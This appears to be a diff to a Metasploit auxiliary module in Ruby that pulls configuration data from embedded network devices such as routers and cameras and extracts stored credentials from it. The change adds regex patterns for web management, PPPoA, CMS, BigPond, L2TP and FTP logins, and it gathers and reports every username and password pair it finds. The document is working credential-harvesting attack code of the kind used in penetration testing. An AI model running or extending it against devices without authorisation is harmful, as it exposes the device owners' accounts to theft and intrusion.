@@ -14,8 +14,14 @@ class Metasploit3 < Msf::Auxiliary
   SETTINGS = {
     'Creds' => [
       [ 'HTTP Web Management', { 'user' => /http_username=(\S+)/i, 'pass' => /http_password=(\S+)/i } ],
+      [ 'HTTP Web Management Login', { 'user' => /login_username=(\S+)/i, 'pass' => /login_password=(\S+)/i } ],
       [ 'PPPoE', { 'user' => /pppoe_username=(\S+)/i, 'pass' => /pppoe_password=(\S+)/i } ],
+      [ 'PPPoA', { 'user' => /pppoa_username=(\S+)/i, 'pass' => /pppoa_password=(\S+)/i } ],
       [ 'DDNS', { 'user' => /ddns_user_name=(\S+)/i, 'pass' => /ddns_password=(\S+)/i } ],
+      [ 'CMS', {'user' => /cms_username=(\S+)/i, 'pass' => /cms_password=(\S+)/i } ], # Found in some cameras
+      [ 'BigPondAuth', {'user' => /bpa_username=(\S+)/i, 'pass' => /bpa_password=(\S+)/i } ], # Telstra
+      [ 'L2TP', { 'user' => /l2tp_username=(\S+)/i, 'pass' => /l2tp_password=(\S+)/i } ],
+      [ 'FTP', { 'user' => /ftp_login=(\S+)/i, 'pass' => /ftp_password=(\S+)/i } ],
     ],
     'General' => [
       ['Wifi SSID', /wifi_ssid=(\S+)/i],
@@ -27,6 +33,7 @@ class Metasploit3 < Msf::Auxiliary
   }
 
   attr_accessor :endianess
+  attr_accessor :credentials
 
   def initialize(info={})
     super(update_info(info,
@@ -58,6 +65,7 @@ class Metasploit3 < Msf::Auxiliary
   def run
     print_status("#{peer} - Attempting to connect and check endianess...")
     @endianess = fingerprint_endian
+    @credentials = {}
 
     if endianess.nil?
       print_error("Failed to check endianess, aborting...")
@@ -187,44 +195,46 @@ class Metasploit3 < Msf::Auxiliary
       parse_general_config(config)
       parse_auth_config(config)
     end
+
+    @credentials.each do |k,v|
+      next unless v[:user] and v[:password]
+      print_status("#{peer} - #{k}: User: #{v[:user]} Pass: #{v[:password]}")
+      auth = {
+          :host => rhost,
+          :port => rport,
+          :user => v[:user],
+          :pass => v[:password],
+          :type => 'password',
+          :source_type => "exploit",
+          :active => true
+      }
+      report_auth_info(auth)
+    end
+
   end
 
   def parse_general_config(config)
     SETTINGS['General'].each do |regex|
       if config.match(regex[1])
         value = $1
-        print_status("#{regex[0]}: #{value}")
+        print_status("#{peer} - #{regex[0]}: #{value}")
       end
     end
   end
 
   def parse_auth_config(config)
     SETTINGS['Creds'].each do |cred|
-      user = nil
-      pass = nil
+      @credentials[cred[0]] = {} unless @credentials[cred[0]]
 
       # find the user/pass
       if config.match(cred[1]['user'])
-        user = $1
-      end
-      if config.match(cred[1]['pass'])
-        pass = $1
+        @credentials[cred[0]][:user] = $1
       end
 
-      # if user and pass are specified, report on them
-      if user and pass
-        print_status("#{peer} - #{cred[0]}: User: #{user} Pass: #{pass}")
-        auth = {
-          :host => rhost,
-          :port => rport,
-          :user => user,
-          :pass => pass,
-          :type => 'password',
-          :source_type => "exploit",
-          :active => true
-        }
-        report_auth_info(auth)
+      if config.match(cred[1]['pass'])
+        @credentials[cred[0]][:password] = $1
       end
+
     end
   end
 
